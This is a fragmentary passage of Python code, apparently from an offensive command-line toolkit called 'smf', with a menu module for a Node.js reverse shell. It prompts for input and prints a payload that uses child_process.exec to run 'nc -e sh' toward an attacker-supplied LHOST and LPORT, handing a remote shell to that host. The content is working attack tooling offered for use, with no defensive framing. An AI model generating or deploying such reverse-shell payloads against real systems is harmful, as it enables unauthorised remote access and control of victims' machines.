...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mrevseshell/node.js\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevseshell/node.js\033[1;31m)> \033[1;32m")
...
time.sleep(0.5)
print("\033[1m\033[92m[+]-[Shell]\033[0m \033[1;34mthis is your reverseshell with node.js")
time.sleep(1)
print(f"""
\033[1;32mrequire('child_process').exec('nc -e sh {LHOST} {LPORT}')
""")
time.sleep(3)
